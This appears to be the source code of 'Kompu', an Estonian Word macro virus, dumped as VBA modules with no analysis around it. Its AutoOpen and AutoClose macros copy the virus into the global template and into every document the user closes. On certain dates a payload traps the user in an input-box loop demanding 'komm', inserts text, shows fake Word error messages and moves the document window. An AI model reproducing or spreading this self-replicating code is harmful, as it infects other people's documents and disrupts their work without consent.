   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim fileenimi$
   'AutoClose
   'Makroviirus Kompu
   On Error Resume Next
   fileenimi$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:String", fileenimi$ + ":String"
   WordBasic.MacroCopy "Global:AutoOpen", fileenimi$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AutoClose", fileenimi$ + ":AutoClose"
   WordBasic.FileSaveAs Name:=fileenimi$, Format:=1
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim kuupaev
   Dim Kompu$
   'AutoOpen
   'Makroviirus Kompu
   On Error Resume Next
   WordBasic.MacroCopy WordBasic.[MacroFileName$]("String") + ":String", "Global:String"
   WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoClose") + ":AutoClose", "Global:AutoClose"
   WordBasic.FileSaveAll 1
   kuupaev = WordBasic.Day(WordBasic.Now())
   If kuupaev = 21 Or kuupaev = 8 Then
   Timer_
   While Kompu$ <> "komm"
   Kompu$ = WordBasic.[InputBox$]("Tahan kommi!", "Mul on paha tuju!")
   Wend
   WordBasic.PrintStatusBar "Nämm-Nämm-Nämm-Nämm-Amps-Amps-Klõmps-Kröök!"
   End If
   End Sub

   Private Sub Timer_()
   Dim tund$
   Dim minut
   Dim sekun$
   Dim uusminut
   Dim uminut$
   Dim aeg$
   tund$ = Str(WordBasic.Hour(WordBasic.Now()))
   minut = WordBasic.Minute(WordBasic.Now())
   sekun$ = Str(WordBasic.Second(WordBasic.Now()))
   uusminut = minut + 3
   uminut$ = Str(uusminut)
   aeg$ = tund$ + ":" + uminut$ + ":" + sekund$
   WordBasic.OnTime aeg$, "String"
   End Sub

   Private Sub Komm()

   End Sub

   Attribute VB_Name = "String_"

   Public Sub MAIN()
   Dim b
   Dim c
   Dim num
   Dim i
   Dim u
   Dim s
   On Error Resume Next
   b = 5
   c = 1
   num = WordBasic.Int(Rnd() * (b - c) + c)
   If num = 1 Then
   WordBasic.CharColor 6
   For i = 1 To 100
   Next i
   WordBasic.Insert "N"
   For i = 1 To 100
   Next i
   WordBasic.Insert "ä"
   For i = 1 To 100
   Next i
   WordBasic.Insert "m"
   For i = 1 To 100
   Next i
   WordBasic.Insert "m"
   For i = 1 To 100
   Next i
   WordBasic.Insert "m"
   For i = 1 To 100
   Next i
   WordBasic.Insert " "

   End If
   If num = 2 Then
   WordBasic.MsgBox "Päris hea komm oli", "Microsoft Word", 16
   End If
   If num = 3 Then
   WordBasic.Bold
   WordBasic.CharColor num
   End If
   If num = 4 Then
   WordBasic.DocMinimize
   WordBasic.DocMinimize
   u = 0
   For i = 1 To 480
   WordBasic.DocMove s, u
   u = u + 1
   s = s + 1
   If u > 300 Then
   u = u - 2
   End If
   Next i
   WordBasic.DocMaximize
   End If
   If num = 5 Then
   For i = 1 To 500
   Next i
   End If
   WordBasic.Call "AutoOpen.Timer_"
   End Sub
